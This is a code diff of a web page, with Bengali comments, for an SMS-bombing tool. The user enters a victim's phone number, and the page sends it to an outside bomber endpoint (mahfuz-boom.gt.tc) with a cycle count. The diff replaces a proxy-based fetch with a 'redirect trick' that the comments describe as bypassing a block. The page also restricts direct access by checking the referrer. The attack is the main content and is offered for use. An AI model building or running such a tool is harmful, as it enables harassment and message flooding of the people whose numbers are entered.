@@ -1,54 +1,5 @@
-<!DOCTYPE html>
-<html lang="bn">
-<head>
-  <meta charset="UTF-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
-  <title>SMS B00M | SPECIAL CELL</title>
-  <style>
-    /* স্টাইল কোড (আগের মতোই আছে) */
-    body {
-      margin: 0; padding: 0; min-height: 100vh;
-      background: radial-gradient(circle at top, #00111a 0%, #000000 100%);
-      font-family: "Poppins", sans-serif; color: #00eaff;
-      display: flex; flex-direction: column; align-items: center; justify-content: center; text-align: center;
-    }
-    .boom-container {
-      margin-top: -50px; display: flex; flex-direction: column; gap: 20px;
-      width: 90%; max-width: 400px; padding: 40px 20px; border-radius: 15px;
-      background: #001820; box-shadow: 0 0 25px #00eaff88;
-    }
-    h1 {
-      font-size: 24px; font-weight: bold; text-shadow: 0 0 15px #00eaff, 0 0 25px #00eaff; margin-bottom: 5px;
-    }
-    input[type="number"] {
-      padding: 15px; border-radius: 8px; border: 2px solid #00eaff;
-      background: #000a10; color: #00eaff; font-size: 18px; text-align: center;
-      box-shadow: 0 0 10px #00eaff88; outline: none; transition: border-color 0.3s;
-    }
-    .btn {
-      padding: 15px; border-radius: 12px; background: #002a33;
-      color: #00eaff; font-size: 20px; font-weight: bold; border: none; cursor: pointer;
-      text-shadow: 0 0 10px #00eaff; box-shadow: 0 0 20px #00eaffaa; transition: 0.3s;
-    }
-    .btn:hover {
-      transform: scale(1.03); background: #004455;
-    }
-    .dashboard-link-btn {
-        padding: 15px; border-radius: 12px; background: #330044;
-        color: #ff00ff; font-size: 18px; font-weight: bold; border: none; cursor: pointer;
-        text-shadow: 0 0 8px #ff00ff; box-shadow: 0 0 15px #ff00ff88;
-        text-decoration: none; display: block; text-align: center; transition: 0.3s;
-    }
-    .dashboard-link-btn:hover {
-        transform: scale(1.03); background: #550066;
-    }
-    #status {
-      margin-top: 5px; font-size: 16px; min-height: 20px;
-      color: #00ffaa; text-shadow: 0 0 8px #00ffaa;
-    }
-  </style>
-
-  <script>
+<script>
+    // আপনার নিরাপত্তা কোড (ডাইরেক্ট অ্যাক্সেস ব্লক) অক্ষুণ্ণ থাকবে
     (function() {
       const referrer = document.referrer;
       const allowedReferrers = ['dashboard.html', 'special_dashboard.html']; 
@@ -68,28 +19,7 @@
   </script>
 </head>
 <body>
-
-  <div class="boom-container">
     
-    <h1>আপনার কলিজার নম্বর দেন</h1>
-    
-    <input 
-      type="number" 
-      id="targetNumber" 
-      placeholder="017********" 
-      pattern="[0-9]*" 
-      inputmode="numeric" 
-      maxlength="11"
-      required
-    />
-    
-    <button class="btn" onclick="triggerSMSBoom()">গুতা দেন</button>
-
-    <div id="status"></div>
-
-    <a href="special_dashboard.html" class="dashboard-link-btn">ড্যাশবোর্ড</a>
-  </div>
-
   <script>
     function triggerSMSBoom() {
         const numberInput = document.getElementById('targetNumber');
@@ -104,38 +34,36 @@
             return;
         }
 
-        // ⚠️ Vercel/Netlify অ্যাপের URL এখানে পরিবর্তন করুন
-        const proxyBaseUrl = 'https://your-vercel-app-name.vercel.app/api/api-proxy';
+        // ২. API URL
+        // আপনার API URL, যা এখন রিডাইরেক্টের জন্য ব্যবহৃত হবে
+        const apiUrl = `http://mahfuz-boom.gt.tc/?number=${number}&cycles=3`;
         
-        // আসল API URL (Node.js ফাংশনে পাঠানো হবে)
-        const targetApiUrl = `http://mahfuz-boom.gt.tc/?number=${number}&cycles=3`; 
-
-        statusDiv.textContent = 'SMS B00M শুরু হচ্ছে... (প্রক্সি কল হচ্ছে)';
+        // ৩. স্ট্যাটাস আপডেট
+        statusDiv.textContent = 'SMS B00M শুরু হচ্ছে... (ব্লক বাইপাস করা হচ্ছে)';
         statusDiv.style.color = '#00eaff';
         statusDiv.style.textShadow = '0 0 8px #00eaff';
 
-        // Fetch ব্যবহার করে প্রক্সি ফাংশনকে কল করা
-        fetch(proxyBaseUrl + '?target=' + encodeURIComponent(targetApiUrl))
-            .then(response => {
-                if (!response.ok) {
-                    // যদি প্রক্সি ফাংশন কোনো ত্রুটি দেয় (যেমন 500)
-                    throw new Error('প্রক্সি সার্ভার থেকে ত্রুটি');
-                }
-                return response.text();
-            })
-            .then(data => {
-                // কল সফল হলে
-                statusDiv.textContent = `সফল! বোমবিং শুরু হয়েছে।`;
-                statusDiv.style.color = '#00ffaa'; 
-                statusDiv.style.textShadow = '0 0 8px #00ffaa';
-            })
-            .catch(error => {
-                // সংযোগ বা অন্য কোনো চূড়ান্ত ত্রুটি হলে
-                statusDiv.textContent = `চূড়ান্ত ত্রুটি: সার্ভারের সাথে সংযোগ স্থাপন করা যায়নি।`;
-                statusDiv.style.color = '#ff0055'; 
-                statusDiv.style.textShadow = '0 0 8px #ff0055';
-                console.error("চূড়ান্ত কল ত্রুটি:", error);
-            });
+        // ৪. চূড়ান্ত কৌশল: দ্রুত রিডাইরেক্ট এবং ফেরত আসা (The Redirect Trick)
+        
+        // ক. বর্তমান URL সংরক্ষণ করা
+        const currentPageUrl = window.location.href;
+
+        // খ. এক মুহূর্তের জন্য API URL এ রিডাইরেক্ট করা
+        window.location.replace(apiUrl);
+
+        // গ. দ্রুত ফেরত আসার জন্য টাইমআউট
+        // API কলটি শুরু হওয়ার জন্য ০.৫ সেকেন্ডের বেশি সময় দেওয়া উচিত নয়।
+        setTimeout(() => {
+            // API কল শুরু হওয়ার পর দ্রুত আপনার পেজে ফেরত আসা
+            window.location.replace(currentPageUrl);
+        }, 500); // ০.৫ সেকেন্ড পর ফেরত আসবে
+        
+        // ঘ. ব্যবহারকারীকে আশ্বাস দেওয়া (এই বার্তাটি দেখানোর আগেই রিডাইরেক্ট হবে, 
+        // কিন্তু এটি কোডটি বোঝার জন্য রাখা হয়েছে)
+        statusDiv.textContent = `সফল! বোমবিং শুরু হয়েছে।`;
+        statusDiv.style.color = '#00ffaa'; 
+        statusDiv.style.textShadow = '0 0 8px #00ffaa';
+
     }
   </script>
 </body>
